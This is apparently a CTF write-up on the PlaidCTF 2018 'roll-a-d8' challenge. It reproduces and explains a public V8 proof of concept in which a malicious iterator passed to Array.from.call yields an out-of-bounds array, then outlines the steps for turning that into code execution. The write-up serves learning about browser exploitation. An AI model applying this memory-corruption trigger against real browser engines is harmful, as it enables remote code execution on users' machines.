# PCTF2018: Roll-a-d8

## Intro

Last year I participated in the Plaid CTF and encountered a challenge called roll-a-d8. It was a challenge to acheive RCE by exploiting a v8 javascript engine. In the challenge there was this hint: https://bugs.chromium.org/p/chromium/issues/detail?id=821137

Also there were some patches made to the sandbox that didn't allow us to use some builtin functions such as print. I couldn't solve the challenge during the CTF because I didn't know anything about binary exploitation back then. A year later I am revisiting it.

## Vulnerability

If you go into the link there is a detailed description about the bug. There is also a PoC. Executing the PoC causes a segmentation fault. Let's take a look at it.

```
let oobArray = [];
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ => (
  {
    counter : 0,
    max : 1024 * 1024 * 8,
    next() {
      let result = this.counter++;
      if (this.counter == this.max) {
        oobArray.length = 0;
        return {done: true};
      } else {
        return {value: result, done: false};
      }
    }
  }
) });
oobArray[oobArray.length - 1] = 0x41414141;
```

I am not really good at javascript so at first I was wondering what it was supposed to be doing. First let's separate the code into parts.

First, what is the method `Array.from.call()` supposed to do? After searching some API documentation I found out two things: `Array.prototype.from()` and `Function.prototype.call()`. Basically `Function.prototpye.call(this,args)` is equal to `Function(args)`. `Array.prototype.from(iterator)` converts the iterator into an array. It is similar to `list()` in python, where a string or tuple can be easily converted into python lists.

Let's format the code so that it is easier to see how the exploit is done.

```
let oobArray = [];

let maliciousIterator = {[Symbol.iterator] : _ => (
  {
    counter : 0,
    max : 1024 * 1024 * 8,
    next() {
      let result = this.counter++;
      if (this.counter == this.max) {
        oobArray.length = 0;
        return {done: true};
      } else {
        return {value: result, done: false};
      }
    }
  }
) }

Array.from.call(function() { return oobArray }, maliciousIterator);
oobArray[oobArray.length - 1] = 0x41414141;
```

Basically an array is created using the `Array.prototype.from(iterator)` where the iterator is crafted wisely so that it messes up the array.

How is the iterator crafted?

```
let maliciousIterator = {[Symbol.iterator] : _ => (
  {
    counter : 0,
    max : 1024 * 1024 * 8,
    next() {
      let result = this.counter++;
      if (this.counter == this.max) {
        oobArray.length = 0;
        return {done: true};
      } else {
        return {value: result, done: false};
      }
    }
  }
) }
```

It basically iterates from 0 to `2**23` and at the last iteration step it changes the oobArray's length to 0. Intuitively this would create an array with a length 0 buffer but with size marked to `2**23`.

Now how can we exploit this OOB bug? I used this useful blog entry as reference: https://bpsecblog.wordpress.com/2017/04/27/javascript_engine_array_oob/

Acoording to it the steps to exploiting an OOB is:

```
1. Create an OOBArray
2. Leak the address of a UINT32 Array using the OOBArray
3. Using the OOBArray trigger OOB on the newly created UINT32 Array.
4. Find target address
5. Overwrite the target
```
